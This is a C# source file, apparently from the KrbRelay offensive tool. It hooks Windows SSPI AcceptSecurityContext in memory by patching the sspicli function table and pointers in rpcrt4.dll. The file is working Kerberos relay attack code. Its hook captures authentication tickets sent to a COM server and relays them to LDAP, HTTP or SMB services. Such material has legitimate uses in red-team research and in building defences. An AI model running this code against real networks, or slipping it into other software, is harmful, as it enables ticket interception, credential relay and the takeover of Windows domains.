using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using KrbRelay.Clients;

// Handles the installation of hooks for SSPI functions (currently only AcceptSecurityContext).
//
// It will update both the function table in sspicli and search for existing references in
// modules that are already loaded - Hook(searchModules). On dispose, it will reset all addresses.

namespace KrbRelay
{
    class SSPIHooks
    {
        private bool hooked = false;
        private IntPtr tablePtr;
        private SecurityFunctionTable table;
        private Dictionary<IntPtr, IntPtr> resets = new Dictionary<IntPtr, IntPtr>();
        private Dictionary<string, Delegate> hooks;

        public unsafe SSPIHooks()
        {
            tablePtr = Interop.InitSecurityInterface();
            table = Marshal.PtrToStructure<SecurityFunctionTable>(tablePtr);
            hooks = new Dictionary<string, Delegate>()
                {
                    {
                        "AcceptSecurityContext",
                        (AcceptSecurityContextFunc)this.AcceptSecurityContext
                    }
                };
        }

        ~SSPIHooks()
        {
            Unhook();
        }

        public unsafe void Hook(string[] searchModules = null)
        {
            Console.WriteLine("[*] Applying SSPI hooks");

            Dictionary<IntPtr, IntPtr> installed = new Dictionary<IntPtr, IntPtr>();

            searchModules = searchModules ?? new string[] { "rpcrt4.dll" };

            foreach (var hook in hooks)
            {
                IntPtr functionPtr = tablePtr + Helpers.FieldOffset<SecurityFunctionTable>(hook.Key);
                IntPtr hookFunction = Marshal.GetFunctionPointerForDelegate(hook.Value);
                IntPtr originalFunction = Marshal.ReadIntPtr(functionPtr);

                Marshal.WriteIntPtr(functionPtr, hookFunction);
                installed[originalFunction] = hookFunction;
                resets[functionPtr] = originalFunction;

                Console.WriteLine(" |- sspicli.dll!SecTableW->{0} [0x{1:X8}]", hook.Key, functionPtr);
            }

            foreach (var module in searchModules)
            {
                IMAGE_SECTION_HEADER dataSection = new IMAGE_SECTION_HEADER();

                IntPtr moduleBase = Interop.GetModuleHandle(module);
                if (moduleBase == IntPtr.Zero)
                    continue;

                // Get the data directory pointer + size

                var dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(moduleBase);
                var ntHeader = Marshal.PtrToStructure<IMAGE_NT_HEADERS>(
                    (IntPtr)(moduleBase.ToInt64() + dosHeader.e_lfanew)
                );

                IntPtr sections = (IntPtr)(
                    moduleBase.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf<IMAGE_NT_HEADERS>()
                );
                for (int i = 0; i < ntHeader.FileHeader.NumberOfSections; i++)
                {
                    var section = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(
                        sections + (i * Marshal.SizeOf<IMAGE_SECTION_HEADER>())
                    );
                    if (new string(section.Name) == ".data")
                    {
                        dataSection = section;
                        break;
                    }
                }

                if (dataSection.VirtualAddress == 0)
                    continue;

                // Search for references we need to hook

                foreach (var hook in installed)
                {
                    for (int k = 0; k < dataSection.VirtualSize; k++)
                    {
                        IntPtr search = (IntPtr)(
                            moduleBase.ToInt64() + dataSection.VirtualAddress + k
                        );
                        if (Marshal.ReadIntPtr(search) == hook.Key)
                        {
                            resets[search] = Marshal.ReadIntPtr(search);
                            Marshal.WriteIntPtr(search, hook.Value);
                            Console.WriteLine(" |- {0}->0x{1:X8}", module, search);
                        }
                    }
                }
            }

            Console.WriteLine();
            hooked = true;
        }

        public void Unhook()
        {
            if (hooked)
            {
                Console.WriteLine("[*] Removing SSPI hooks");

                foreach (var reset in resets)
                {
                    Marshal.WriteIntPtr(reset.Key, reset.Value);
                    Console.WriteLine(" |- 0x{0:X8}", reset.Key);
                }
                hooked = false;
            }
        }

        public unsafe SecurityStatusCode AcceptSecurityContext(
            SspiHandle* phCredential,
            SspiHandle* phContext, // This might be null on first call, ref hates that
            SecurityBufferDescriptor* pInput,
            AcceptContextReqFlags fContextReq,
            uint TargetDataRep,
            SspiHandle* phNewContext,
            SecurityBufferDescriptor* pOutput,
            uint* pfContextAttr,
            LARGE_INTEGER* ptsTimeStamp
        )
        {
            SecurityStatusCode result = SecurityStatusCode.InternalError;

            // Get kerberos tickets sent to our com server

            if (State.apRep1.Length == 0)
            {
                byte[] ticket = Helpers.ConvertApReq(pInput->GetTokenBytes());
                State.UpdateApReq(ticket);

                var pPlaceholder = new SecurityBufferDescriptor(12288);
                result = Interop.AcceptSecurityContext(
                    ref *phCredential,
                    ref *phContext,
                    ref *pInput,
                    fContextReq,
                    TargetDataRep,
                    ref *phNewContext,
                    ref pPlaceholder,
                    ref *pfContextAttr,
                    ref *ptsTimeStamp
                );

                Console.WriteLine("[*] AcceptSecurityContext: {0}", result);
                Console.WriteLine(" |- Context Flags: {0}", fContextReq);
            }
            else if (State.apRep2.Length == 0)
            {
                State.UpdateApRep2(pInput->GetTokenBytes());
            }
            else
            {
                Console.WriteLine("[*] AcceptSecurityContext hook returning {0}", result);
                return result;
            }

            string service = State.spn.Split('/').First();
            if (service.ToLower() == "ldap")
            {
                Ldap.Connect();
            }
            else if (service.ToLower() == "http")
            {
                Http.Connect();
            }
            else if (service.ToLower() == "cifs")
            {
                Smb.Connect();
            }

            if (State.apRep1.Length == 0)
            {
                Console.WriteLine("[!] apRep1 is empty!");
                return result;
            }

            if (State.apRep2.Length == 0)
            {
                pOutput->UpdateTokenBytes(State.apRep1);
            }

            return result;
        }
    }
}
